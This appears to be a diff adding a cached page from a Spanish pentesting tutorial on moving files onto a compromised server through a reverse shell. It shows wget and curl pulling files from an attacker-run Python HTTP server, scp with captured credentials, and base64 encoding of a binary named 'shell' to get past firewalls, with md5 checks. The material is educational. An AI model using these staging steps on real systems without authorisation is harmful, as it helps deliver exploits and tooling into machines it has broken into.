@@ -1,0 +1,45 @@
+I"�<p>Es habitual que, durante un ejercico de <em>pentesting</em>, necesitemos transferir archivos al servidor remoto; como <em>scripts</em> de enumeración, <em>exploits</em> o transferir datos a nuestra
+máquina de ataque. Si bien algunas herramientas como Metasploit nos permiten usar el comando <code class="language-plaintext highlighter-rouge">Upload</code> para subir un fichero, debemos aprender métodos para transferirlos desde un
+intérprete inverso estándar.</p>
+
+<h3 id="wget"><a href="#header-1"></a>wget</h3>
+
+<p>Un método es correr un servidor HTTP con Python en nuestra máquina y usar <code class="language-plaintext highlighter-rouge">wget</code> o <code class="language-plaintext highlighter-rouge">cURL</code> para descargar el archivo en la máquina remota. Primero, vamos al directorio que contiene
+el archivo que nos interesa transferir y lanzamos un servidor HTTP con Python allí:<br />
+<code class="language-plaintext highlighter-rouge">cd /tmp</code><br />
+<code class="language-plaintext highlighter-rouge">python3 -m http.server 8000</code><br />
+Ahora podemos descargar el archivo en la máquina remota (RCE) con:<br />
+<code class="language-plaintext highlighter-rouge">wget http://&lt;nuestra_IP&gt;:8000/&lt;archivo&gt;</code><br />
+Si la máquina remota no tiene <code class="language-plaintext highlighter-rouge">wget</code> podemos usar <code class="language-plaintext highlighter-rouge">cURL</code>:<br />
+<code class="language-plaintext highlighter-rouge">curl http://&lt;nuestra_IP&gt;:8000/&lt;archivo&gt; -o &lt;nombre_que_le_damos&gt;</code></p>
+
+<h3 id="scp"><a href="#header-2"></a>SCP</h3>
+
+<p>Otro método de transferencia es <code class="language-plaintext highlighter-rouge">scp</code>, para usarlo debemos haber conseguido crendeciales de usuario ssh en la máquina remota. Ejemplo:<br />
+<code class="language-plaintext highlighter-rouge">scp &lt;archivo&gt; &lt;usuario&gt;@&lt;IP_remota&gt;:/&lt;directorio_remoto&gt;/&lt;nombre_archivo&gt;</code></p>
+
+<h3 id="base64"><a href="#header-3"></a>Base64</h3>
+
+<p>En algunos casos no podremos transferir el archivo. Debido a, por ejemplo, un cortafuegos que nos impida descargar un archivo desde nuestra máquina. Cuando esto nos ocurra,
+podemos usar un truco simple para codificar el archivo en formato <code class="language-plaintext highlighter-rouge">base64</code>, copiar la cadena en el servidor y descodificarla. Si quisiéramos transferir un binario llamado <code class="language-plaintext highlighter-rouge">shell</code>,
+haríamos:<br />
+<code class="language-plaintext highlighter-rouge">base64 &lt;nombre_archivo&gt; -w 0</code><br />
+Copiaríamos la cadena de texto y en la máquina remota:<br />
+<code class="language-plaintext highlighter-rouge">echo &lt;cadena_de_texto&gt; | base64 -d &gt; &lt;nombre_archivo&gt;</code></p>
+
+<h3 id="validar-archivos-transferidos"><a href="#header-4"></a>Validar Archivos Transferidos</h3>
+
+<p>Para validar el formato de un fichero:<br />
+<code class="language-plaintext highlighter-rouge">file &lt;archivo&gt;</code><br />
+Si se corresponde con lo que pretendíamos enviar, lo más seguro es que haya sido un envío exitoso.<br />
+De todas formas, podemos asegurarnos de que no hemos fallado al codificar/descodificar el archivo comparando las cadenas md5 hash:</p>
+<ol>
+  <li>En nuestra máquina:<br />
+<code class="language-plaintext highlighter-rouge">md5sum &lt;archivo&gt;</code></li>
+  <li>En el objetivo:<br />
+<code class="language-plaintext highlighter-rouge">md5sum &lt;archivo&gt;</code></li>
+  <li>Comparamos las cadenas (iguales == correcto)</li>
+</ol>
+
+<p>Hay más métodos de transferencia de ficheros, que podemos estudiar en el módulo <em>File Transfers</em>.</p>
+:ET
